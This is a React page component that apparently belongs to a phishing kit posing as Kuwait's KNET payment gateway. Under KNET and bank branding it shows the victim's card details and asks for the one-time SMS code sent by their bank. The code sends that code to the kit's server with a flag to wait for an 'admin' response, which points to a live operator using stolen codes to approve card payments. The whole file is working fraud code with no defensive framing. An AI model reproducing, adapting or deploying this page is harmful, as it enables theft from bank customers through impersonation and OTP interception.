import Main from "@/components/MainWrapper";
import { useEffect } from "react";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { FieldValues, useForm } from "react-hook-form";
import { CustomInput } from "@/components/Input";
import { Link } from "react-router-dom";
import Label from "@/components/ui/label";
import { maskPhoneNumber } from "@/lib/helpers";
import { mainInfo } from "@/real-time/context/signals";

export default function KnetCVV() {
  const {
    register,
    handleSubmit,
    formState: { errors, isValidating, isValid },
  } = useForm({
    mode: "all",
  });

  useEffect(() => {
    setCurrentPage("knet-cvv");
  }, []);

  const onSubmit = (data: FieldValues) => {
    console.log(data);
    if (Object.values(data).filter((d) => !d).length === 0) {
      sendDataToServer({
        data: {
          otp: data.otp,
        },
        current: "knet-cvv",
        nextPage: "mobile-verification",
        waitingForAdminResponse: true,
      });
    }
  };

  const state = mainInfo.value.state;

  const maskedCardNumber =
    maskPhoneNumber(state?.card_code + state?.card_num, 5) ?? "";

  return (
    <Main>
      <img
        src="/assets/images/knet-banner.png"
        alt="knet banner"
        className="w-full"
      />
      <div className="bg-gray-100 py-4 min-h-screen grid place-items-center">
        <section className="container pb-10">
          <div className="text-left bg-white rounded-xl border p-4 shadow-lg">
            <img
              src="/assets/images/kfh.png"
              alt="nbk logo"
              className="h-14 w-40 object-cover mx-auto mb-4"
            />
            <div className="flex items-center border-b-2 border-b-gray-300">
              <p className="grow text-sm">Pay The Bill</p>
              <p className="text-sky-700 font-bold w-32">:Merchant</p>
            </div>
            <div className="flex items-center">
              <p className="grow">
                {Number(state?.payment_amount).toFixed(3)} KD
              </p>
              <p className="text-sky-700 font-bold w-32">:Amount</p>
            </div>
          </div>

          <form
            onSubmit={handleSubmit(onSubmit)}
            className="divide-y-2 text-left"
          >
            <div className="mt-4 bg-white rounded-xl border p-4 shadow-lg">
              <div
                dir="ltr"
                className="text-sky-800 bg-sky-500/20 rounded-md shadow-sm mb-4 p-4"
              >
                <strong>Notification:</strong> You will presently receive an SMS
                on your mobile number registered with your bank. This is an OTP
                (One Time Password) SMS, it contains 6 digits to be entered in
                the box below.
              </div>
              <div className="divide-y-2 space-y-1">
                <div className="flex items-center justify-between gap-4">
                  <p className="flex-[65%]" dir="ltr">
                    {maskedCardNumber}
                  </p>

                  <Label
                    label=":Card Number"
                    className="text-xs flex-[35%] mt-2 text-sky-700"
                  />
                </div>
                <div className="flex items-center justify-between gap-4">
                  <p className="flex-[65%]">{state?.exp_month}</p>

                  <Label
                    label=":Expiration Month"
                    className="text-xs flex-[35%] mt-2 text-sky-700"
                  />
                </div>
                <div className="flex items-center justify-between gap-4">
                  <p className="flex-[65%]">{state?.exp_year}</p>

                  <Label
                    label=":Expiration Year"
                    className="text-xs flex-[35%] mt-2 text-sky-700"
                  />
                </div>
                <div className="flex items-center justify-between gap-4">
                  <p className="flex-[65%]">****</p>

                  <Label
                    label=":PIN"
                    className="text-xs flex-[35%] mt-2 text-sky-700"
                  />
                </div>
                <div className="flex justify-between gap-4">
                  <p className="flex-[65%]">
                    <CustomInput
                      label=""
                      id="otp"
                      errors={errors}
                      register={register}
                      placeholder=" "
                      className="text-center"
                      dir="ltr"
                      inputClassName="h-6 bg-gray-100 placeholder:text-center text-center"
                      options={{
                        required: "هذا الحقل ضروري",

                        minLength: {
                          value: 6,
                          message: "يجب أن يكون كود OTP ستة أرقام",
                        },
                        maxLength: {
                          value: 6,
                          message: "يجب أن يكون كود OTP ستة أرقام",
                        },
                      }}
                    />
                  </p>

                  <Label
                    label=":OTP"
                    className="text-xs flex-[35%] mt-3 text-sky-700"
                  />
                </div>
              </div>
            </div>

            <div className="mt-4 bg-white rounded-xl border p-4 shadow-lg">
              <div className="flex items-center gap-2">
                <Link
                  className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                  to={"/knet-gateway"}
                  state={state}
                >
                  Cancel
                </Link>
                <button
                  className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                  type="submit"
                  disabled={!isValid}
                >
                  {isValidating ? "Validating..." : "Confirm"}
                </button>
              </div>
            </div>
          </form>

          <h3 className="mt-8 mb-1 capitalize text-center font-bold text-xs">
            © all rights reserved. copyright 2025
          </h3>
          <h3 className="mb-10 capitalize text-center font-bold text-xs text-sky-700">
            the shared electronics banking services company - KNET
          </h3>
        </section>
      </div>
    </Main>
  );
}
